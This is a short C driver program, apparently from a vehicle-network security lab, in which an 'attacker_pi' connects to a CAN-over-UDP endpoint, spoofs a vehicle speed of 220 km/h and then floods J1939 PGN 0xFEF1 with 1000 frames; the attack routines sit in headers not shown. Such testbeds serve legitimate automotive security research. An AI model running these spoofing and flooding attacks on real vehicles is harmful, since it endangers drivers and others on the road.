#include "../common/can_drv.h"
#include "attack_spoof.h"
#include "attack_dos.h"
#include <unistd.h>

int main(void) {
    // attacker_pi: local = 192.168.1.10:50001, remote = 192.168.1.20:50000
    if (!can_init("0.0.0.0", 50001, "192.168.1.20", 50000)) {
        return 1;
    }

    // simple loop: send spoof, then DoS
    attack_spoof_speed(220);   // 220 km/h
    sleep(1);
    attack_dos_flood_pgn(0xFEF1, 1000); // 1000 frames

    return 0;
}
